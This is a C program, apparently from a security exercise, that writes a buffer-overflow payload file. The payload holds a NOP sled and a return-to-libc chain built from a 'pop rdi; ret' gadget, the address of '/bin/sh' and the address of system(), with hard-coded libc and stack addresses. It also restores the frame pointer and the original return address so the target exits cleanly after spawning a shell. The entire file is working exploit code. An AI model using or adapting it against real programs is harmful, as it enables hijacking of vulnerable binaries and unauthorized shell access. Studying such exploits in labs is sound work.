#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char* littleEndian(char *str, int numChars);

// 0x7fffffffdca0 <- start of buf according to a.out
// 0x7ffff7a48070 <- Address of system library call in libc
// 0x7ffff7baa5d5 <- 0x5f 0xc3 (gadget) pop %rdi  retq
// prev fp value: 0x400550 
// 0x7ffff7a2188a <- original return when main calls puts

#define ADDR_SIZE 64
#define BITS_IN_BYTE 8

//preserve fp for clean exit
#define ORIG_FP_ADDRESS "0x400550"//"0x7fffffffdc00"

//preserve return address for clean exit
#define ORIG_MAIN_RET "0x7ffff7a2188a"

//address of /bin/sh in libc
#define BIN_SH_ADDR "0x7ffff7b99673"

//address of "system" library call
#define SYSTEM_ADDR "0x7ffff7a48070"

//address of gadget
#define GADGET "0x7ffff7baa5d5"

//address of a "retq" command
#define RETQ "0x7ffff7baa5d6"
#define BYTES_IN_ADDR 8

int main(int argc, char *argv[]){
  FILE *file = fopen("in", "wb");
  int fileSize;
  int i;
  char nop = 0x90;
  char input;
  int numChars;
  unsigned char *instFile;
  unsigned char *mainRet;
  unsigned char *retAddr;
  unsigned char *shAddr;
  unsigned char *sysAddr;
  unsigned char *fpAddr;
  unsigned char *gadget2;

  //strcpy(addr, "0x7fffffffdc30");

  //fp address
  fpAddr = littleEndian(ORIG_FP_ADDRESS, BYTES_IN_ADDR);
  //fpAddr = littleEndian("0x7fffffffdc00", 8);

  //value of prev fp
  //mainRet = littleEndian("0x7ffff7a2188a", 8);
  mainRet = littleEndian(ORIG_MAIN_RET, BYTES_IN_ADDR);
  
  //address of /bin/sh in little endian
  //shAddr = littleEndian("0x7ffff7b99673", 8);
  shAddr = littleEndian(BIN_SH_ADDR, BYTES_IN_ADDR);

  //address of system library call little endian
  sysAddr = littleEndian(SYSTEM_ADDR, BYTES_IN_ADDR);

  //address of gadget
  //retAddr = littleEndian("0x7ffff7baa5d5", 8);
  retAddr = littleEndian(GADGET, BYTES_IN_ADDR);

  //address of retq in gadget
  gadget2 = littleEndian(RETQ, BYTES_IN_ADDR);
  
  unsigned char *byteAddr;

  if(argc != 2){
    printf("Wrong number of arguments, use ./gen [num_bytes_in_buffer]\n");
    printf("num_bytes_in_buffer: number of bytes in the buffer (assumes buffer is first local variable).\n");
    exit(1);
  }

  numChars = atoi(argv[1]) + BYTES_IN_ADDR; //+8 bytes to overwrite fp 
  
  if(file == NULL){
    printf("Error opening file. Exiting.");
    exit(1);
  }
  
  //write nop sled up to number of characters
  for(i = 1; i <= numChars; ++i){
    fwrite(&nop, 1, 1, file);
  }
    
  //overwrite return address with gadget address
  fwrite(retAddr, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);

  //write address of /bin/sh
  fwrite(shAddr, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);

  //return to gadget retq to align stack 16 bytes
  fwrite(gadget2, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);

  //write address of 'system' library call
  fwrite(sysAddr, sizeof(char),  ADDR_SIZE / BITS_IN_BYTE, file);

  //rewrite original FP
  fwrite(fpAddr, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);
  
  //rewrite original return address
  fwrite(mainRet, sizeof(char), ADDR_SIZE / BITS_IN_BYTE, file);  

  
  free(mainRet);
  free(retAddr);
  free(shAddr);
  free(sysAddr);
  free(fpAddr);

  fclose(file); 
}


/*
  littleEndian takes a character address and a specified required number of bytes,
  it returns the address (assumed to be in the form 0x000000) in little endian format,
  padded with zeroes. 
 */
unsigned char* littleEndian(char *addr, int numBytes){

  //stop people from attempting to write address that is longer than possible
  if(numBytes > ADDR_SIZE / BITS_IN_BYTE){
    return NULL;
  }
  
  unsigned char *tmpRet = malloc(ADDR_SIZE / 4);
  unsigned char *ret = malloc(ADDR_SIZE / BITS_IN_BYTE);
  char tmp, tmp2;
  int i = 0, j;

  //convert address to a hex number
  long long hex = strtoll(addr, NULL, 16);

  //pad for size 
  for(i = 0; i < (ADDR_SIZE / 4) - numBytes; i++){
    tmpRet[i] = 0;
  }

  i = ADDR_SIZE / 4 - 1;

  //place hex into char array digit by digit
  while(hex != 0){ 
    tmpRet[i] = hex & 0xF;
    hex = hex >> 4;
    i--;
  }
   
  //swap byte order
  j = ADDR_SIZE / 4 - 1;
  for(i = 0; i < ADDR_SIZE / 8; i+=2){
    tmp = tmpRet[i];
    tmp2 = tmpRet[i+1];

    tmpRet[i] = tmpRet[j-1];
    tmpRet[i+1] = tmpRet[j];    
    
    tmpRet[j - 1] = tmp;
    tmpRet[j] = tmp2;

    j-=2;
  }
  
  //crunch char array to maintain one byte of hex in each element (rather than a single hex digit).
  for(i = 0; i < ADDR_SIZE / 8; i++){
    ret[i] = tmpRet[(i*2)] << 4 | tmpRet[(i*2)+1];
  }

  return ret;
}
